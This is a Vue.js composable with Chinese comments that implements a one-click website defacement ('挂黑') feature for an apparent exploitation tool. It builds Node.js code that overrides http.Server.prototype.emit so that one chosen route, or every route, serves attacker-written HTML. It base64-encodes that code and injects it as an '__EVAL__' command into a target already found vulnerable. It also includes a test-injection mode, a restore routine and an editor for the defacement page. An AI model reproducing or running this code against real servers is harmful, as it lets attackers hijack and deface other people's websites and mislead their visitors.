/**
 * POC 一键挂黑功能 Composable
 * 负责页面劫持、注入、恢复等功能
 */
import { ref, nextTick, watch } from 'vue'
import { getDefaultHijackTemplate } from '../config/hijackTemplate'

// Base64 编码函数
const base64Encode = (str) => {
  return btoa(unescape(encodeURIComponent(str)))
}

// 防抖函数
const debounce = (fn, delay) => {
  let timer = null
  return function (...args) {
    if (timer) clearTimeout(timer)
    timer = setTimeout(() => fn.apply(this, args), delay)
  }
}

export function usePocHijack() {
  const hijackRouteMode = ref('specific')
  const hijackTargetRoute = ref('/')
  const isHijacking = ref(false)
  const isRestoring = ref(false)
  const hijackEditorContainer = ref(null)
  const showHijackInjectDialog = ref(false)
  const showHijackPreviewDialog = ref(false)
  const showHijackRestoreDialog = ref(false)
  const saveStatus = ref('saved') // 'saved' | 'saving' | 'unsaved'
  let hijackEditor = null
  let isUpdatingFromEditor = false // 防止循环更新的标志

  // 使用统一的默认模板
  const getDefaultHijackHtml = () => {
    return getDefaultHijackTemplate()
  }

  const hijackHtmlContent = ref(getDefaultHijackHtml())

  // 加载缓存的挂黑代码
  const loadCachedHijackHtml = async () => {
    try {
      const result = await window.api.storage.loadSettings()
      if (result.success && result.settings?.hijackHtmlCache) {
        hijackHtmlContent.value = result.settings.hijackHtmlCache
        console.log('✅ 已加载缓存的挂黑代码')
      }
    } catch (error) {
      console.error('加载挂黑代码缓存失败:', error)
    }
  }

  // 实际保存函数
  const doSave = async (html) => {
    saveStatus.value = 'saving'
    try {
      const result = await window.api.storage.loadSettings()
      if (result.success) {
        const settings = result.settings || {}
        settings.hijackHtmlCache = html
        await window.api.storage.saveSettings(settings)
        saveStatus.value = 'saved'
        console.log('💾 挂黑代码已保存')
      }
    } catch (error) {
      console.error('保存挂黑代码缓存失败:', error)
      saveStatus.value = 'saved' // 即使失败也重置状态
    }
  }

  // 保存挂黑代码到缓存（防抖）
  const saveCachedHijackHtml = debounce(doSave, 1000)

  // 监听内容变化，自动保存
  watch(hijackHtmlContent, (newHtml, oldHtml) => {
    // 只要内容发生变化就保存（包括空内容、默认模板等）
    if (newHtml !== oldHtml) {
      saveStatus.value = 'unsaved'
      saveCachedHijackHtml(newHtml)

      // 如果不是从编辑器更新的，需要同步到编辑器
      if (!isUpdatingFromEditor && hijackEditor) {
        const currentValue = hijackEditor.getValue()
        if (currentValue !== newHtml) {
          hijackEditor.setValue(newHtml)
        }
      }
    }
  })

  // 初始化时加载缓存
  loadCachedHijackHtml()

  // 生成劫持代码
  const generateHijackCode = (route, html) => {
    const escapedHtml = html.replace(/\\/g, '\\\\').replace(/`/g, '\\`').replace(/\$/g, '\\$')

    if (route === '*') {
      // 全局劫持
      return `(async()=>{const h=await import('node:http');const u=await import('node:url');if(!global.__originalEmit){global.__originalEmit=h.Server.prototype.emit;}h.Server.prototype.emit=function(e,...a){if(e==='request'){const[q,s]=a;const p=u.parse(q.url,true);if(q.method==='GET'){s.writeHead(200,{'Content-Type':'text/html; charset=utf-8'});s.end(\`${escapedHtml}\`);return true;}}return global.__originalEmit.apply(this,arguments);};})();`
    } else {
      // 指定路由劫持
      return `(async()=>{const h=await import('node:http');const u=await import('node:url');if(!global.__originalEmit){global.__originalEmit=h.Server.prototype.emit;}if(!global.__hijackRoutes){global.__hijackRoutes=new Map();}global.__hijackRoutes.set('${route}',\`${escapedHtml}\`);h.Server.prototype.emit=function(e,...a){if(e==='request'){const[q,s]=a;const p=u.parse(q.url,true);if(q.method==='GET'&&global.__hijackRoutes.has(p.pathname)){s.writeHead(200,{'Content-Type':'text/html; charset=utf-8'});s.end(global.__hijackRoutes.get(p.pathname));return true;}}return global.__originalEmit.apply(this,arguments);};})();`
    }
  }

  // 显示注入对话框
  const showInjectDialog = (url, isVulnerable, showSnackbar) => {
    if (!url) {
      showSnackbar('请输入目标URL', 'warning')
      return
    }

    if (!isVulnerable) {
      showSnackbar('目标不存在漏洞，无法注入', 'error')
      return
    }

    showHijackInjectDialog.value = true
  }

  // 确认注入
  const confirmInjectHijack = async (url, showSnackbar) => {
    isHijacking.value = true

    try {
      const route = hijackRouteMode.value === 'global' ? '*' : hijackTargetRoute.value
      const html = hijackHtmlContent.value

      const hijackCode = generateHijackCode(route, html)
      const base64Code = base64Encode(hijackCode)
      const command = `__EVAL__:${base64Code}`

      const result = await window.api.executePOC(url, command)

      if (result.success && result.data.is_vulnerable) {
        showHijackInjectDialog.value = false
        showSnackbar('挂黑代码注入成功！', 'success')
      } else {
        showSnackbar('注入失败: ' + (result.error || '未知错误'), 'error')
      }
    } catch (error) {
      showSnackbar('注入错误: ' + error.message, 'error')
    } finally {
      isHijacking.value = false
    }
  }

  // 预览挂黑页面
  const previewHijack = () => {
    showHijackPreviewDialog.value = true
  }

  // 测试挂黑
  const testHijack = async (url, isVulnerable, showSnackbar) => {
    if (!url) {
      showSnackbar('请输入目标URL', 'warning')
      return
    }

    if (!isVulnerable) {
      showSnackbar('目标不存在漏洞，无法测试', 'error')
      return
    }

    if (!hijackHtmlContent.value.trim()) {
      showSnackbar('请先编写页面内容', 'warning')
      return
    }

    // 生成随机路由
    const randomRoute = '/_test_' + Math.random().toString(36).substring(2, 15)
    const html = hijackHtmlContent.value

    showSnackbar('正在注入临时测试路由...', 'info')

    try {
      const hijackCode = generateHijackCode(randomRoute, html)
      const base64Code = base64Encode(hijackCode)
      const command = `__EVAL__:${base64Code}`

      const result = await window.api.executePOC(url, command)

      if (result.success && result.data.is_vulnerable) {
        const testUrl = url + randomRoute

        setTimeout(() => {
          if (window.api?.openExternal) {
            window.api.openExternal(testUrl)
          } else {
            window.open(testUrl, '_blank')
          }
          showSnackbar('临时测试路由已打开: ' + randomRoute, 'success')
        }, 500)
      } else {
        showSnackbar('注入临时路由失败', 'error')
      }
    } catch (error) {
      showSnackbar('测试错误: ' + error.message, 'error')
    }
  }

  // 显示恢复对话框
  const showRestoreDialog = (url, isVulnerable, showSnackbar) => {
    if (!url) {
      showSnackbar('请输入目标URL', 'warning')
      return
    }

    if (!isVulnerable) {
      showSnackbar('目标不存在漏洞，无法恢复', 'error')
      return
    }

    showHijackRestoreDialog.value = true
  }

  // 确认恢复
  const confirmRestoreHijack = async (url, showSnackbar) => {
    isRestoring.value = true

    try {
      const restoreCode = `(async()=>{const h=await import('node:http');if(global.__originalEmit){h.Server.prototype.emit=global.__originalEmit;delete global.__originalEmit;}if(global.__hijackRoutes){delete global.__hijackRoutes;}})();`
      const base64Code = base64Encode(restoreCode)
      const command = `__EVAL__:${base64Code}`

      const result = await window.api.executePOC(url, command)

      if (result.success && result.data.is_vulnerable) {
        showHijackRestoreDialog.value = false
        showSnackbar('网站路由已恢复正常！', 'success')
      } else {
        showSnackbar('恢复失败: ' + (result.error || '未知错误'), 'error')
      }
    } catch (error) {
      showSnackbar('恢复错误: ' + error.message, 'error')
    } finally {
      isRestoring.value = false
    }
  }

  // 初始化挂黑编辑器
  const initHijackEditor = async (forceReinit = false) => {
    if (!hijackEditorContainer.value) {
      console.warn('⚠️ hijackEditorContainer 不存在')
      return
    }

    // 如果编辑器已存在且不强制重新初始化
    if (hijackEditor && !forceReinit) {
      console.log('✅ 编辑器已存在，跳过初始化')
      // 检查编辑器是否还在DOM中
      try {
        hijackEditor.layout()
        return
      } catch (e) {
        // 编辑器已被销毁，需要重新创建
        console.warn('⚠️ 编辑器已失效，将重新创建')
        hijackEditor = null
      }
    }

    // 如果强制重新初始化，先清理旧编辑器
    if (forceReinit && hijackEditor) {
      console.log('🔄 强制重新初始化编辑器')
      try {
        hijackEditor.dispose()
      } catch (e) {
        console.error('清理旧编辑器失败:', e)
      }
      hijackEditor = null
    }

    await nextTick()

    // 确保加载了缓存的内容
    await loadCachedHijackHtml()

    console.log('🎨 开始初始化挂黑编辑器...')

    try {
      const monaco = await import('monaco-editor')
      hijackEditor = monaco.editor.create(hijackEditorContainer.value, {
        value: hijackHtmlContent.value,
        language: 'html',
        theme: 'vs',
        automaticLayout: true,
        minimap: { enabled: false },
        fontSize: 14,
        lineNumbers: 'on',
        scrollBeyondLastLine: false,
        wordWrap: 'on',
        padding: { top: 16, bottom: 16 }
      })

      // 监听编辑器内容变化
      hijackEditor.onDidChangeModelContent(() => {
        isUpdatingFromEditor = true
        const newContent = hijackEditor.getValue()
        hijackHtmlContent.value = newContent
        // 使用 nextTick 确保 watch 执行完毕后再重置标志
        nextTick(() => {
          isUpdatingFromEditor = false
        })
      })

      console.log('✅ 挂黑编辑器初始化成功')
    } catch (error) {
      console.error('❌ 挂黑编辑器初始化失败:', error)
    }
  }

  // 清理编辑器
  const cleanup = () => {
    if (hijackEditor) {
      try {
        hijackEditor.dispose()
      } catch (e) {
        console.error('销毁挂黑编辑器失败:', e)
      }
      hijackEditor = null
    }
  }

  // 恢复默认模板
  const resetToDefaultTemplate = () => {
    const defaultHtml = getDefaultHijackHtml()
    hijackHtmlContent.value = defaultHtml
    // watch 会自动同步到编辑器并触发保存
    console.log('✅ 已恢复默认挂黑模板')
  }

  // 获取编辑器实例（用于调试）
  const getEditor = () => hijackEditor

  return {
    hijackRouteMode,
    hijackTargetRoute,
    isHijacking,
    isRestoring,
    hijackEditorContainer,
    showHijackInjectDialog,
    showHijackPreviewDialog,
    showHijackRestoreDialog,
    hijackHtmlContent,
    saveStatus,
    showInjectDialog,
    confirmInjectHijack,
    previewHijack,
    testHijack,
    showRestoreDialog,
    confirmRestoreHijack,
    initHijackEditor,
    cleanup,
    resetToDefaultTemplate,
    getEditor
  }
}
